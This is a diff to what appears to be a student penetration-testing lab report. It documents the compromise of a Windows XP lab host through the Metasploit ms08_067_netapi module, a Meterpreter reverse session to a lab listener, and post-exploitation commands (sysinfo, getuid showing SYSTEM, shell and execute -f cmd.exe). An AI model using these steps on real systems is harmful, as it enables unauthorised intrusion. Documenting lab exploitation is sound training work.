@@ -245,7 +245,7 @@ Example output: **3389/tcp open** (`ssl/ms-wbt-server`), **`ssl-date`** / **cloc
 | **Open ports (from host table)** | **139, 445** (SMB), RDP likely given Nessus |
 | **Nessus highlights** | **Unsupported XP** (critical), **SMB** issues, **RDP** MiTM class, many **info** SMB/plugin rows |
 | **SMB null enum (this run)** | **`enum4linux -a`** — **no NetBIOS reply** from **`10.20.160.100`**; **`Server doesn't allow session using username '', password ''`** — remainder of tests aborted ([`100-001`](../Screenshots/100-001_enum4linux_null_session_denied_no_nbtstat_tm6_afrocha.png)). Do **not** assume **null SMB** works until **`nmap`** shows **137/139/445** reachable and **`smbclient -L -N`** / **CME** agree. |
-| **Shell (validated)** | **`exploit/windows/smb/ms08_067_netapi`** → **Meterpreter** — fingerprint **Windows XP SP3** (English), **`LHOST`** lab IP — [`100-003`](../Screenshots/100-003_msf_ms08_067_netapi_meterpreter_session_tm6_afrocha.png). **Wrong lane:** **`ms17_010_eternalblue`** targets **Win7/2008 R2** pool layouts; use **`ms08_067`** on **XP** when **`check`** / **`nmap`** match. |
+| **Shell (validated)** | **`exploit/windows/smb/ms08_067_netapi`** → **Meterpreter** — fingerprint **Windows XP SP3** (English), **`LHOST`** lab IP — [`100-003`](../Screenshots/100-003_msf_ms08_067_netapi_meterpreter_session_tm6_afrocha.png). **Post-ex:** **`sysinfo`** — hostname **ADRASTEA**, domain **JUPITER**, **x86**; **`getuid`** — **`NT AUTHORITY\SYSTEM`**; **`shell`** then **`echo … %date% %time%`** (Meterpreter has **no** **`echo`**) — [`100-004`](../Screenshots/100-004_meterpreter_sysinfo_system_shell_echo_tm6_afrocha.png). **Wrong lane:** **`ms17_010_eternalblue`** targets **Win7/2008 R2** pool layouts; use **`ms08_067`** on **XP** when **`check`** / **`nmap`** match. |
 
 ### Vulnerabilities (brief)
 
@@ -299,6 +299,8 @@ run
 
 **4 — With Meterpreter open (`meterpreter >`):**
 
+**`echo`:** Meterpreter is **not** `cmd.exe` — **`echo`** → **`Unknown command`**. Use **`shell`** first, then **`echo YOURTAG %date% %time%`** at **`C:\WINDOWS\system32>`** (or run **`execute -f cmd.exe -a "/c echo …" -H`** if you stay in Meterpreter).
+
 ```text
 meterpreter > sysinfo
 meterpreter > getuid
@@ -329,6 +331,7 @@ msf5 > sessions -l
 | **100-001** | [`100-001_enum4linux_null_session_denied_no_nbtstat_tm6_afrocha.png`](../Screenshots/100-001_enum4linux_null_session_denied_no_nbtstat_tm6_afrocha.png) | **`enum4linux -a 10.20.160.100`** — **no nbtstat reply**, **null** **`''`/`''`** session **not allowed** — standard anonymous SMB enum **blocked** on this run |
 | **100-002** | [`100-002_msf_ms17_010_check_135_timeout_still_vulnerable_tm6_afrocha.png`](../Screenshots/100-002_msf_ms17_010_check_135_timeout_still_vulnerable_tm6_afrocha.png) | **`ms17_010_eternalblue` → `check`** — **`[-] … timed out … :135`** alongside **`[+] … likely VULNERABLE`** / **target is vulnerable** (RPC path flaky; see MSF note above) |
 | **100-003** | [`100-003_msf_ms08_067_netapi_meterpreter_session_tm6_afrocha.png`](../Screenshots/100-003_msf_ms08_067_netapi_meterpreter_session_tm6_afrocha.png) | **`ms08_067_netapi`** **`run`** — **XP SP3** (English) — **Meterpreter session** **`10.20.150.106:4444` → `10.20.160.100`** |
+| **100-004** | [`100-004_meterpreter_sysinfo_system_shell_echo_tm6_afrocha.png`](../Screenshots/100-004_meterpreter_sysinfo_system_shell_echo_tm6_afrocha.png) | **`sysinfo`** — **ADRASTEA** / **JUPITER** / **XP SP3** **x86**; **`getuid`** **SYSTEM**; **`shell`** → **`echo`** with **`%date% %time%`** (evidence stamp) |
 
 ---
 
